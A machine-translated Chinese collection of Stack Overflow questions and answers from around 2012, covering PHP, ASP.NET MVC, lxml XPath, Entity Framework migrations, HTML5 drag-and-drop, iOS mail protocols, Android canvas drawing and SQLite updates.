这应该使用 str_ireplace 工作（注意 i）。我不确定，但它应该像这样工作：`str_ireplace(array('%', '%', '%'), array(1, 2, 3), '%.%.%')`. 我现在没有办法测试它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T22:02:15.573

正如 Scuzzy 在评论中推荐的那样，`vsprintf()`结果正是我想要的。谢谢！

# asp.net-mvc - 不明确的预编译错误

> ID：11927294
> 
> 赞同：2
> 
> 时间：2012-08-13T01:39:52.770
> 
> 标签：asp.net-mvc, asp.net-mvc-3, appharbor

从 VS2012 RC 部署我的 ASP.NET MVC 3 应用程序时，我不断收到以下错误。我猜测我的代码中的某些内容不正确，但是，我无法从错误信息中确定问题代码所在的位置。此代码构建在我的家庭和工作 PC 上。有什么帮助吗？

```
d:\temp\zb5bedyk.2dr\temp\root\6b14f900\b1889a38\App_Web_nrwr2tuj.0.cs(37): error CS1041: Identifier expected; 'long' is a keyword
d:\temp\zb5bedyk.2dr\temp\root\6b14f900\b1889a38\App_Web_nrwr2tuj.0.cs(37): error CS1519: Invalid token '>' in class, struct, or interface member declaration

[HttpCompileException]: d:\temp\zb5bedyk.2dr\temp\root\6b14f900\b1889a38\App_Web_nrwr2tuj.0.cs(37): error CS1041: Identifier expected; 'long' is a keyword
   at System.Web.Compilation.AssemblyBuilder.Compile()
   at System.Web.Compilation.WebDirectoryBatchCompiler.CompileAssemblyBuilder(AssemblyBuilder builder)
   at System.Web.Compilation.WebDirectoryBatchCompiler.CompileNonDependentBuildProviders(ICollection buildProviders)
   at System.Web.Compilation.WebDirectoryBatchCompiler.Process()
   at System.Web.Compilation.BuildManager.BatchCompileWebDirectoryInternal(VirtualDirectory vdir, Boolean ignoreErrors)
   at System.Web.Compilation.BuildManager.BatchCompileWebDirectory(VirtualDirectory vdir, VirtualPath virtualDir, Boolean ignoreErrors)
   at System.Web.Compilation.BuildManager.PrecompileWebDirectoriesRecursive(VirtualDirectory vdir, Boolean topLevel)
   at System.Web.Compilation.BuildManager.PrecompileWebDirectoriesRecursive(VirtualDirectory vdir, Boolean topLevel)
   at System.Web.Compilation.BuildManager.PrecompileWebDirectoriesRecursive(VirtualDirectory vdir, Boolean topLevel)
   at System.Web.Compilation.BuildManager.PrecompileWebDirectoriesRecursive(VirtualDirectory vdir, Boolean topLevel)
   at System.Web.Compilation.BuildManager.PrecompileAppInternal(VirtualPath startingVirtualDir)
   at System.Web.Compilation.BuildManager.PrecompileApp(VirtualPath startingVirtualDir)
   at System.Web.Compilation.BuildManager.PrecompileApp(ClientBuildManagerCallback callback)
   at System.Web.Compilation.BuildManagerHost.PrecompileApp(ClientBuildManagerCallback callback)
   at System.Web.Compilation.BuildManagerHost.PrecompileApp(ClientBuildManagerCallback callback)
   at System.Web.Compilation.ClientBuildManager.PrecompileApplication(ClientBuildManagerCallback callback, Boolean forceCleanBuild)
   at System.Web.Compilation.ClientBuildManager.PrecompileApplication(ClientBuildManagerCallback callback)
   at System.Web.Compilation.Precompiler.Main(String[] args)

An error occurred during the website precompile. Precompilation failed with exit code 1 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T03:31:32.793

如果不需要，您可以选择在应用程序设置中禁用预编译。

另请注意，AppHarbor 基础架构上尚未安装 .NET 4.5（很快就会安装），因此您可能需要将项目目标降低到 4.0。

# objective-c - 如何在一个视图中使用两个 NSOutlineview？

> ID：11927297
> 
> 赞同：1
> 
> 时间：2012-08-13T01:41:04.467
> 
> 标签：objective-c, cocoa, nstableview, nsview, nsoutlineview

如何在一个视图中使用两个 NSOutlineview？如果我在一个 NSoutlineview 中使用 rowAtpoint() 方法，我得到了正确的结果，但是在另一个处于同一视图中的 NSoutlineview 上没有给出正确的结果

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T10:39:27.387

您可以使用[NSSplitView](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/ApplicationKit/Classes/NSSplitView_Class/Reference/Reference.html)。查看[SplitViews 示例代码](https://developer.apple.com/library/mac/#samplecode/SplitViews/Introduction/Intro.html#//apple_ref/doc/uid/DTS40011336)。
![NSSplitView](../Images/b27fb5f304c8554350c3e04ab429e41d.png)

# python - 如何根据文本节点的值添加xml节点

> ID：11927298
> 
> 赞同：5
> 
> 时间：2012-08-13T01:41:06.117
> 
> 标签：python, xml, xpath, lxml

我正在玩找到@ [http://www.jsphylosvg.com/examples/source.php?example=2&t=xml的 xml 文件](http://www.jsphylosvg.com/examples/source.php?example=2&t=xml)

如果节点的值，我想插入一个节点`name="Espresso"`。

例如，我想改变：

```
<clade>
<name>Espresso</name>
<branch_length>2.0</branch_length>
</clade> 
```

到：

```
<clade>
<name>Espresso</name>
<url>www.espresso.com</url>
<branch_length>2.0</branch_length>
</clade> 
```

根据我到目前为止所做的研究，我可以使用它`xpath`来查找包含 espresso 的节点*（这应该可以，但它不可以吗？）*

```
import re, sys
import lxml.etree
f = open("test.xml", "r")
data = f.read()
tree = lxml.etree.XML(data)
if tree.xpath('//name/text()="Espresso"'):
    insert new child here 
```

此时应该可以使用use`lxml.etree.Element`来制作xml节点，并使用insert将它们附加到xml文档中

然而，虽然这在理论上听起来很棒，但我无法让它发挥作用。
我真的很感激任何帮助/建议

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T02:40:19.540

您的 XPath 语句并不完全正确。这就是我认为你想要的：

```
>>> DOC = """<clade>
... <name>Espresso</name>
... <branch_length>2.0</branch_length>
... </clade>"""
>>> 
>>> import lxml.etree
>>> tree = lxml.etree.XML(DOC)
>>> matches = tree.xpath('//name[text()="Espresso"]') 
```

然后在匹配后追加元素：

```
>>> for e in matches:
...    sibling = lxml.etree.Element("url")
...    sibling.text = "www.espresso.com"
...    e.addnext(sibling)

>>> print lxml.etree.tostring(tree)
<clade>
<name>Espresso</name><url>www.espresso.com</url>
<branch_length>2.0</branch_length>
</clade> 
```

**编辑：**

由于您的文档具有命名空间，因此您希望将命名空间映射传递给 XPath 函数并在标记名称前加上命名空间前缀，如下所示：

```
>>> nsmap = {'phylo': 'http://www.phyloxml.org'}
>>> tree.xpath('//phylo:name[text()="Espresso"]', namespaces=nsmap)
[<Element {http://www.phyloxml.org}name at 0x2c875f0>] 
```

# entity-framework - Entity Framework中CODE FIRST下的_MigrationHistory表是如何创建的？

> ID：11927301
> 
> 赞同：1
> 
> 时间：2012-08-13T01:41:59.257
> 
> 标签：entity-framework, code-first, entity-framework-migrations

> **可能重复：**
> [EF（实体框架）4.3 迁移工具不适用于 EF 4.1 DB](https://stackoverflow.com/questions/9523133/ef-entity-framework-4-3-migration-tool-does-not-work-on-ef-4-1-db)

当使用实体框架代码优先模式建库时，会创建一个系统表类型的表'_MigrationHistory'。我该如何手动创建这样的表？代码优先教程向我们展示了如何首先编写代码来构建新数据库，而不是在现有数据库上，当我想在现有数据库上使用代码的数据库迁移功能时，我发现我失败了。并且没有创建名为“_MigrationHistory”的表。我找到了一个解决方案' [http://thedatafarm.com/blog/data-access/using-ef-migrations-with-an-existing-database/](http://thedatafarm.com/blog/data-access/using-ef-migrations-with-an-existing-database/) '可以解决我的问题，但是需要复制一个步骤（应该在这里“创建”）表“_MigrationHistory”到现有数据库，它是系统类型的对象，我如何创建这样的表？

我的英语很差，我的表达可能会让你感到困惑。不希望。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T08:29:13.813

您不需要手动创建 __MigrationHistory。您只需要创建初始迁移。初始迁移将为您创建表。此命令将添加调用的初始迁移`InitialMigration`并忽略您在项目中拥有的所有实体：

```
Add-Migration InitialMigration -IgnoreChanges 
```

这意味着您应该在应用程序中的类反映您的初始数据库时运行此命令。所有应由迁移处理的更改都必须在创建初始迁移后完成。[这](http://www.ladislavmrnka.com/2012/03/ef-4-3-migrations-and-existing-database/)是整个教程。

# javascript - SoundManager2 - 停止声音时的失真

> ID：11927302
> 
> 赞同：1
> 
> 时间：2012-08-13T01:42:58.037
> 
> 标签：javascript, flash, settimeout, html5-audio, soundmanager2

我正在尝试遍历 SoundManager2 中的一堆声音文件并在不同的时间点播放它们。下面的代码采用如下所示的 songArray，其中“note”由声音文件和播放该声音文件的持续时间组成：

```
var songArray = [[null],[["clarinet_e4.mp3",1],["clarinet_a4.mp3",1]],[null],[null],[null],[null],[["clarinet_c4.mp3",1]],[["clarinet_c5.mp3",1]],[null],[["clarinet_ab4.mp3",1]],[["clarinet_f3.mp3",1]],[null],[["clarinet_g4.mp3",1]],[["clarinet_d5.mp3",1]],[null],[null]] 
```

它遍历数组中的每个 X 并播放为给定 X 找到的声音。然后在持续时间给定的时间后停止声音。代码运行完美，只是当声音停止时，它会在歌曲结束时发出爆裂声。

```
function playSong(X) {
    playSongNotesAtXValue(X);
    window.setTimeout(function() {
        X++;
        if (X >= theSong.songArray.length) {
            X = 0;
        }
        playSong(X);
    }, (30/theSong.tempo)*1000)
}

function playSongNotesAtXValue(X) {
    var columnToPlay = theSong.songArray[X];
    if (columnToPlay[0] != null) {
        for (i = 0; i < columnToPlay.length; i++) {
            var note = columnToPlay[i]; 
            soundManager.play(note[0],{volume:30});
            window.setTimeout(function() {
                soundManager.stop(note[0]);
            }, (note[1]*30/theSong.tempo)*1000);   
        }
    }
} 
```

有什么想法可能是错的吗？

PS 我们已经在最新版本的 Safari、Chrome 和 Firefox 上进行了尝试。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-05T17:30:15.427

如果我正确地跟随你，你正在播放音频文件，然后在文件中间的任意点停止。这通常会导致输出的不连续性，这将导致爆裂声或咔嗒声，因为信号在一个样本中从高电平跳到零。要消除这种情况，您必须将输入的音量从初始音量平滑地减小到零，而不是从初始音量突然变为零。

您通常可以使用线性插值来完成这个“平滑”任务：[http ://blog.bjornroche.com/2010/10/linear-interpolation-for-audio-in-cc.html](http://blog.bjornroche.com/2010/10/linear-interpolation-for-audio-in-c-c.html)

抱歉，我不太了解 SoundManager2，无法理解您是否已经在这样做。

# javascript - HTML5 DnD dataTransfer setData 或 getData 不能在除 Firefox 之外的所有浏览器中工作

> ID：11927309
> 
> 赞同：49
> 
> 时间：2012-08-13T01:44:14.093
> 
> 标签：javascript, jquery, html, drag-and-drop

考虑这个[JSFiddle](http://jsfiddle.net/MtypZ/124/)。它在 Firefox (14.0.1) 中运行良好，但在 Windows (7) 和 OS X (10.8) 上的 Chrome (21.0.1180.75)、Safari (?) 和 Opera(12.01?) 中失败。据我所知，问题出在对象上的`setData()`or`getData()`方法上。`dataTransfer`这是来自 JSFiddle 的相关代码。

```
var dragStartHandler = function (e) {
    e.originalEvent.dataTransfer.effectAllowed = "move";
    e.originalEvent.dataTransfer.setData("text/plain", this.id);
};

var dragEnterHandler = function (e) {
    //  dataTransferValue is a global variable declared higher up.
    //  No, I don't want to hear about why global variables are evil,
    //  that's not my issue.
    dataTransferValue = e.originalEvent.dataTransfer.getData("text/plain");

    console.log(dataTransferValue);
}; 
```

据我所知，这应该可以正常工作，如果您在拖动项目时查看控制台，您会看到写出的 id，这意味着它可以很好地找到元素并抓住它的 id 属性。问题是，是不设置数据还是不获取数据？

我会很感激建议，因为经过一周的尝试和大约 200 多个版本，我开始失去理智。我所知道的是它曾经在 60 版左右工作，并且特定代码根本没有改变......

~~实际上，6X 和 124 之间的主要区别之一是我将事件绑定从 更改`live()`为`on()`. 我不认为这是问题所在，但在处理 DnD 时，我发现 Chrome 出现了一些失败。~~这已被揭穿。事件绑定方法对问题没有影响。

**更新**

我创建了一个新的[JSFiddle](http://jsfiddle.net/VzXqK/2/)，它完全去除了所有内容，只留下了事件绑定和处理程序。我用 jQuery 1.7.2 和 1.8`on()`和`live()`. 问题仍然存在，所以我降低了一个级别并删除了所有框架并使用纯 JavaScript。问题*仍然*存在，因此根据我的测试，不是我的代码失败了。相反，Chrome、Safari 和 Opera 似乎都在实施`setData()`或`getData()`不符合规范，或者只是由于某种原因而失败。如果我错了，请纠正我。

无论如何，如果您查看新的 JSFiddle，您应该能够复制该问题，只需在拖动指定接受放置的元素时查看控制台。[我已经开始使用Chromium](http://code.google.com/p/chromium/issues/detail?id=142508)开了一张票。最后我可能仍然做错了什么，但我现在根本不知道如何做 DnD。新的 JSFiddle 被尽可能地精简了......

* * *

## 回答 #1

> 赞同：88
> 
> 时间：2012-08-14T19:26:51.603

好的，经过一番挖掘，我发现问题实际上不在于 Chrome、Safari 和 Opera。给出的结果是 Firefox 支持它，我不能说其他浏览器都失败了，因为我通常会接受 IE。

问题的真正原因是[DnD 规范本身](http://developers.whatwg.org/dnd.html#concept-dnd-p)。根据, ,和events 的规范`drag`，拖动数据存储模式是*保护模式*。你问什么是*保护模式*？这是：`dragenter``dragleave``dragover``dragend`

 **> 对于所有其他事件。表示拖动数据的项的拖动数据存储列表中的格式和种类可以枚举，但数据本身不可用，不能添加新数据。

这意味着，*“您无法访问您设置的数据，即使在只读模式下也不行！自己去 f@&#。”* . 真的吗？想出这个的天才是谁？

现在，要绕过这个限制，您几乎没有选择，我只会概述我想出的两个。您的第一个是使用邪恶的全局变量并污染全局命名空间。您的第二个选择是使用 HTML5 localStorage API 来执行与 DnD API 应该提供的完全相同的功能！

如果你沿着我的这条路线走，你现在正在实现两个 HTML5 API，不是因为你*想*这样做，而是因为你*必须这样*做。现在我开始欣赏PPK对 HTML5 DnD API[的灾难的咆哮。](http://www.quirksmode.org/blog/archives/2009/09/the_html5_drag.html)

最重要的是，需要更改规范以允许访问存储的数据，即使它仅处于只读模式。就我而言，[使用这个 JSFiddle](http://jsfiddle.net/MtypZ/126/)，我实际上是在使用`dragenter`来查看放置区域并验证我是否应该允许放置发生或不发生。

在这种情况下，Mozilla 显然选择不完全遵守规范，这就是为什么我的 JSFiddle 在其中运行良好的原因。碰巧这是我完全支持不支持完整规范的一次。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2013-03-15T19:30:13.400

“受保护”位是有原因的......拖放可以跨越完全不同的窗口，他们不希望有人能够实现一个“监听器” DIV，它会窃听所有内容的内容拖过它（可能通过 AJAX 将这些内容发送到 Elbonia 的某个间谍服务器）。只有 DROP 区域（更清楚地在用户的控制之下）获得完整的独家新闻。

烦人，但我明白为什么它可能被认为是必要的。

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2013-12-03T06:35:36.473

```
var dragStartHandler = function (e) {
    e.originalEvent.dataTransfer.effectAllowed = "move";
    e.originalEvent.dataTransfer.setData("text/plain", this.id);
}; 
```

问题在于“文本/纯文本”。MSDN 文档中 setData 的标准规范只是“文本”（没有 /plain）。在我尝试过的任何版本中，Chrome 都接受 /plain，但 IE 不接受。

我为同样的问题苦苦挣扎了好几个星期，试图弄清楚为什么我的“drop”事件在 IE 中没有正确触发，而在 Chrome 中却没有正确触发。这是因为 dataTransfer 数据没有正确加载。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2012-12-28T21:48:30.983

我知道你已经回答了这个问题，但这是一个有用的线程——我只是想在这里添加一个附录——如果你自己设置数据，你可以随时将数据添加到字段本身（我知道很难看），但它可以避免重新创建功能：

例如，如果设置您自己的自定义数据：

```
 dataTransfer.setData('mycustom/whatever', 'data'); 
```

将数据附加为新的数据条目，并迭代：

```
 dataTransfer.setData('mycustom/whatever/data/{a json encoded string even}'); 
```

查询：

```
// naive webkit only look at the datatransfer.types
if (dataTransfer.types.indexOf('mycustom/whatever') >= 0) {

    var dataTest = 'mycustom/whatever/data/';

    // loop through types and create a map
    for (var i in types) {

        if (types[i].substr(0, dataTest.length) == dataTest) {

            // shows:
            // {a json encoded string even}
            console.log('data:', types[i].substr(dataTest.length));

            return; // your custom handler
        }
    }
} 
```

仅在 chrome 中测试

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2015-06-26T12:56:12.973

还值得注意的是，如果您使用超时离开执行链，则 dataTransfer 对象将不再拥有您的数据。例如

```
function dropEventHandler(event){
    var dt = event.dataTransfer.getData("text/plain"); // works
    var myEvent = event;

    setTimeout(function(){
       var dt = myEvent.dataTranfer.getData("text/plain"); // null
    }, 1);
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2016-02-19T06:12:06.513

我在下面的代码中遇到了同样的错误：

> event.originalEvent.dataTransfer.setData("text/plain", event.target.getAttribute('id'));

我将代码更改为：

> event.originalEvent.dataTransfer.effectAllowed = "移动"; event.originalEvent.dataTransfer.setData("text", event.target.getAttribute('id'));

它对我有用。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-12-13T18:31:11.217

我遇到这篇文章是因为我对 Chrome 的功能`dataTransfer.setData()`和`dataTransfer.getData()`功能有类似的体验。

我的代码看起来像这样：

```
HTML:
<div ondragstart="drag(event)" ondrop="newDrop(event)"></div>

JAVASCRIPT:
function drag(ev) {
    ev.dataTransfer.setData("text", ev.target.id);
}
function newDrop(ev){
    var itemDragged = ev.dataTransfer.getData("text");
    var toDropTo = ev.target.id;
} 
```

该代码在 Internet Explorer 中运行良好，但在 Chrome 中进行测试时，我无法使用newDrop 函数中的函数获取`dataTransfer`对象中设置的值（在拖动函数中设置） 。`dataTransfer.getData()`我也无法从语句中获取 id 值`ev.target.id`。

在网络上进行了一些挖掘之后，我发现我应该使用事件参数`currentTarget`属性而不是事件`target`属性。更新后的代码如下所示：

```
JAVASCRIPT:
function drag(ev) {
    ev.dataTransfer.setData("text", ev.currentTarget.id);
}
function newDrop(ev){
    var itemDragged = ev.dataTransfer.getData("text");
    var toDropTo = ev.currentTarget.id;
} 
```

通过这一更改，我能够在 chrome 和 Internet Explorer 中使用`dataTransfer.setData()`和函数。`dataTransfer.getData()`我没有在其他任何地方测试过，我不确定为什么会这样。希望这会有所帮助，并希望有人可以给出解释。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2019-03-05T16:47:10.137

我正在使用 Firefox 进行网站测试。

在我笔记本电脑上的 WAMP 中，像 OP 这样的代码可以工作。但是，当我将网站移至 HOSTMONSTER 时，它在那里不起作用。

我遵循了 Joshua Espana 的回答，它解决了我的问题。

失败的：

```
ev.dataTransfer.setData("text/plain", ev.target.id); 
```

工作：

```
 ev.dataTransfer.setData("text", ev.currentTarget.id); 
```

谢谢，约书亚！**

# ios - 创建一个新的 iOS 邮件客户端

> ID：11927310
> 
> 赞同：-2
> 
> 时间：2012-08-13T01:44:15.977
> 
> 标签：ios, exchange-server, imap, pop3

我从哪里获得有关 POP、IMAP、Exchange API 连接信息的信息？我已经弄清楚了用户界面；我只是找不到任何有关连接到 POP、IMAP、Exchange API 的信息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T01:48:21.420

POP、IMAP、Exchange 和 SMTP 都是与服务器通信以访问和发送电子邮件的 Internet 协议。iOS 本身并不直接公开任何这些功能。您要么必须自己构建它，要么找到可以使用的库。

自己实现这些将是一项*繁重*的工作。Google 可以为您提供大量关于 POP 和 IMAP 的信息，这些都是开放的标准协议。

POP 规范：[https ://www.rfc-editor.org/rfc/rfc1939](https://www.rfc-editor.org/rfc/rfc1939)

IMAP 规范：[https ://www.rfc-editor.org/rfc/rfc3501](https://www.rfc-editor.org/rfc/rfc3501)

（这些都不包括安全 TLS，或其他现代和关键的扩展。）你最好找到一个能在你的应用程序中使用这些协议的库。

您还需要 SMTP 用于出站邮件——POP 和 IMAP 规范涵盖了访问邮箱，但不包括发送电子邮件。

Exchange 使用 MAPI/RPC，这是 Microsoft 拥有和维护的专有标准。 [http://en.wikipedia.org/wiki/Messaging_Application_Programming_Interface](http://en.wikipedia.org/wiki/Messaging_Application_Programming_Interface) 如果没有许可证和可能来自 Microsoft 的代码，您不太可能使用此协议。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T01:48:59.253

POP 和 IMAP 是 Internet 标准。您可以在相关的 RFC 中找到它们的文档。

Exchange 显然是 Microsoft 的专有协议，因此 MS 网站可能是开始的地方。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-17T12:32:31.657

MailCore 是一个 Mac 和 iOS 库，旨在减轻使用电子邮件协议的痛苦。MailCore 是包含支持 SMTP、IMAP、POP3、RFC822、MIME 和 HTML 消息呈现的电池。

[http://libmailcore.com/](http://libmailcore.com/)

# entity-framework - 指定的表不存在。[ __MigrationHistory ]

> ID：11927311
> 
> 赞同：4
> 
> 时间：2012-08-13T01:44:17.527
> 
> 标签：entity-framework, ef-code-first, sql-server-ce, entity-framework-4.3, entity-framework-migrations

自从 Entity Framework Code First 可用以来，我一直在使用以下方法：

```
public virtual void CreateDatabase()
{
    var dbContext = _dbContextLocator.Current;
    dbContext.Database.Delete();
    dbContext.Database.Create();
    dbContext.Database.Initialize(true);
} 
```

最近，我注意到当`dbContext.Database.Create()`被击中时，我得到以下异常：

> System.Data.SqlServerCe.SqlCeException 发生
> Message=指定的表不存在。[ __MigrationHistory ]
> Source=SQL Server Compact ADO.NET 数据提供程序错误代码
> =-2147467259
> HResult=-2147217865
> NativeError=0
> StackTrace：在 System.Data.SqlServerCe.SqlCeCommand.ProcessResults(Int32 hr)
> InnerException：

如果我去调试 - 异常并检查“公共语言运行时异常”的抛出，这会导致执行停止，我得到上述异常。如果我取消选中它，数据库似乎已正确创建，但在我的输出窗口中出现以下错误语句的四次重复：

> System.Data.SqlServerCe.dll 中发生“System.Data.SqlServerCe.SqlCeException”类型的第一次机会异常 System.Data.SqlServerCe.dll 中发生“System.Data.SqlServerCe.SqlCeException”类型的 第
> 一次机会异常
> System.Data.SqlServerCe.Entity.dll 中发生“System.Data.SqlServerCe.SqlCeException”类型的
> 机会异常 System.Data.Entity.dll 中发生“System.Data.EntityCommandExecutionException”类型的
> 第一次机会异常 第一次机会异常System.Data.Entity.dll 中发生“System.Data.EntityCommandExecutionException”类型的“System.Data.EntityCommandExecutionException”
> 类型的第一次机会异常发生在 System.Data.Entity.dll

放置一个 try/catch 块`dbContext.Database.Create()`没有任何效果。

我的目标是创建一个完全空白的数据库，然后手动填充数据。我不想使用实体框架的新迁移功能。

我能做些什么来消除第一次机会异常？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-13T16:45:25.207

> 我的目标是创建一个完全空白的数据库

假设您的意思是具有模型所需的实际模式对象的数据库？

如果是这样，您有两个选择：

1) 忽略异常 - 使用 SqlCE，EF 在创建数据库时在内部使用迁移管道。例外是 Migrations 如何确定 __MigrationHistory 表存在的实现细节。

2) 使用遗留 API - ObjectContext 上的数据库创建 API 使用遗留的非迁移代码路径。将您的 DbContext 转换为 IObjectContextAdapter 以获得 ObjectContext 引用。

# php - 电子邮件在php中循环

> ID：11927314
> 
> 赞同：-2
> 
> 时间：2012-08-13T01:44:41.093
> 
> 标签：php, email, smtp

我使用下面的代码从我的数据库向许多人发送电子邮件，但它通常会超时并且不会发送给所有人。请告诉我如何在 php 中设置它，以便它在 php 中每 10 分钟仅发送 1000 封电子邮件？

```
require_once "Mail.php";

$from = "xxx Support <$sender>";
$to = "$to";
$subject = "$subject";
$body = "Dear $fname,\n\n$note\n\n\nYou are getting this email because you registered on our website www.xxx.com and agreed to our Terms and Conditions which includes to receive email from us at any time to your email address $to.";

$host = "smtp1.xxx.net";
$username = "no_reply@xxx.net";
$password = "4t46546$#@?";

$headers = array ('From' => $from,
  'To' => $to,
  'Subject' => $subject);
$smtp = Mail::factory('smtp',
  array ('host' => $host,
    'auth' => true,
    'username' => $username,
    'password' => $password));

$mail = $smtp->send($to, $headers, $body);

if (PEAR::isError($mail)) {
  echo("<p>" . $mail->getMessage() . "</p>");
}

// Show sent emails.
echo "$row[fname] $row[lname] ($row[email])<br>";
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T03:09:01.287

您可以修改脚本以从某个数量开始拉取收件人，直到所有收件人都得到服务，输出 META 重定向以强制浏览器从停止的位置重新加载。

想象：

```
<?php
// Start from $x, or zero if no $x
$x = ( isset( $_REQUEST['x'] ) ? $_REQUEST['x'] : 0 ); 

// Count total number of recipients
$rs = mysql_query('SELECT COUNT(*) AS total FROM recipients ');  
if ( $rs ) $row = mysql_fetch_assoc( $rs );
$total = $row['total'];

// Pull recipients $x through $x+1000 from database  
$rs = mysql_query('SELECT * FROM recipients ORDER BY email ASC LIMIT ' . $x . ', 1000 ' );
// Count number of recipients in query result set
$num_recipients = mysql_num_rows( $rs ); 

while ( $row = mysql_fetch_assoc( $rs ) ){
    // Send the message here...
}

if ( ( $num_recipients + $x) < $total ){
    // We've not yet reached the total # of recipients
    // Output the meta redirect to start from ($x+1000).
    echo '<meta http-equiv="REFRESH" content="0;url=this-script.php?x=' . ($x+1000) . '">';
} else {
    // We've finished, do something...
} 
```

# java - 标记未出现在圆心

> ID：11927316
> 
> 赞同：4
> 
> 时间：2012-08-13T01:45:33.003
> 
> 标签：java, android, android-canvas

这是我下面的代码，它在 Circle 内绘制一个 Circle，并将我当前的位置作为圆的中心。我正在我当前的位置显示一个星号标记。

**问题陈述：-**

下面的代码工作正常，但我遇到的唯一问题是`Star Sign Marker`，它不在圆心。我需要我`Star Sign Marker` `(android.R.drawable.star_on)`总是在圆圈的中心。

`imageNames[0]`是以下代码中的圆心（星号标记）。

任何建议都会对我有很大帮助。

```
 @Override
    public boolean draw(Canvas canvas, MapView mapView, boolean shadow, long when) {
        super.draw(canvas, mapView, shadow);

        Point screenPts = new Point();
        mapView.getProjection().toPixels(pointToDraw, screenPts);
        //--------------draw circle----------------------
        Point pt = mapView.getProjection().toPixels(pointToDraw,screenPts);
        Paint circlePaint = new Paint(Paint.ANTI_ALIAS_FLAG);
        circlePaint.setColor(0x30000000);
        circlePaint.setStyle(Style.FILL_AND_STROKE);

        int totalCircle=4;
        int radius=40;
        int centerimagesize=13;

        for (int i = 1; i <= totalCircle; i ++) { 
            canvas.drawCircle(screenPts.x,screenPts.y, i*radius, circlePaint); 
            canvas.drawBitmap(BitmapFactory.decodeResource(getResources(),imageNames[i]), ((screenPts.x)+(i*radius)),(screenPts.y), null);
        } 

        canvas.drawBitmap(BitmapFactory.decodeResource(getResources(),imageNames[0]), (screenPts.x-(centerimagesize/2)),(screenPts.y-(centerimagesize/2)), null);

        super.draw(canvas,mapView,shadow);

        return true;
    } 
```

下面是我目前在模拟器中获得的屏幕截图。我需要星号始终位于圆心。我正在运行安卓 4.1

![在此处输入图像描述](../Images/3505e980ef46023ceb99ce04eb5692e8.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-16T17:11:01.170

对我来说，您似乎忘记考虑您的标记大小。您可能应该开始在以下位置绘制：

```
screenPts.x - (centerimagesize + starSignWidth)/2
screenPts.y - (centerimagesize + starSignHeight)/2 
```

您实际上要做的就是告诉画布开始在屏幕中间的左上角绘制标记。这意味着星形标记中心与您的屏幕中心不同。

Canvas.drawBitmap(Bitmap bitmap, float left, float top, Paint paint) 的 API 说：

> 绘制指定的位图，其左上角在 (x,y)

[http://developer.android.com/reference/android/graphics/Canvas.html#drawBitmap%28android.graphics.Bitmap,%20float,%20float,%20android.graphics.Paint%29](http://developer.android.com/reference/android/graphics/Canvas.html#drawBitmap%28android.graphics.Bitmap,%20float,%20float,%20android.graphics.Paint%29)

这正是你所做的。您的标记左上角位于屏幕中间。

# jquery - jQuery Accordion 与 jQuery.post 并替换

> ID：11927321
> 
> 赞同：1
> 
> 时间：2012-08-13T01:46:38.560
> 
> 标签：jquery, accordion

所以我使用 jQuery 手风琴来折叠/展开“事件”：基本上我得到了一堆 youtube 视频并将它们放在一个 div 中，点击后会展开。但是，当我这样做时，有时一半屏幕会变黑，所以我想知道发生了什么。我对加载动画或介于两者之间的东西很好，但不知道该怎么做。

```
$('.header').click(function() {
    var thisDiv = $(this);
    if (thisDiv.parent()
               .next('.content:not(:empty)').text().length > 0)         
    {
        $.get('/videos', function(data) {
            thisDiv.parent().next('.content').html(data);
            $('#events').accordion();
        }); 
    }
}); 
```

从 /videos 返回的数据是 youtube 视频，所以...

```
<iframe width="560" height="315" src="http://www.youtube.com/embed/ALUxf1R0aXU" frameborder="0" allowfullscreen></iframe>
<iframe width="560" height="315" src="http://www.youtube.com/embed/ALUxf1R0aXU" frameborder="0" allowfullscreen></iframe>
<iframe width="560" height="315" src="http://www.youtube.com/embed/ALUxf1R0aXU" frameborder="0" allowfullscreen></iframe> 
```

...ETC...

这是最好的方法吗？我正在用从 jQuery.get 返回的数据替换 .content div ....这是格式化的最佳方法吗？我意识到返回的视频必须渲染，但我不知道如何处理。谢谢你的帮助！

# xcode - 如何在文档目录中向 SQLite DB 添加 >100 条新行而不覆盖？

> ID：11927324
> 
> 赞同：1
> 
> 时间：2012-08-13T01:47:24.000
> 
> 标签：xcode, sqlite, xcode4.3

我有一个用于 iPad 应用程序的 SQLite 表。它目前有大约 500 个项目，但我需要添加大约 200 多个。问题是，该应用程序已经部署并拥有用户，并且它是文档目录中的一个可编辑数据库，所以我不能直接覆盖它。如何在不破坏已有表的情况下轻松添加这些新行？以某种方式导入 txt 而不必手动执行此操作会很好。（为了记录，我没有使用核心数据。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T05:38:03.067

抛出一些想法：

您能否不在更新中部署新的数据库文件，并以编程方式检测是否存在现有数据库。如果是这样，请将新数据添加到数据库中，如果没有以编程方式创建新数据库，并将所有数据添加到其中。

您可以将设置数据存储在 xml 文件中吗？

或者，您的更新可以有第二个数据库吗？您不会覆盖原始数据库并添加 v1.1 数据库文件？然后您可以将 v1.1 数据合并到原始数据库中吗？

# android - 将手机的内置警报链接到应用程序

> ID：11927325
> 
> 赞同：1
> 
> 时间：2012-08-13T01:47:29.283
> 
> 标签：android, alarm

我是android编程的初学者，目前我正在做一个需要使用警报的应用程序。我需要将手机中的内置警报链接到我的应用程序，但现在我不知道该怎么做。任何帮助将不胜感激。非常感谢！

# jquery - 用 Chrome 中的自定义文本替换默认的 html5 日期占位符

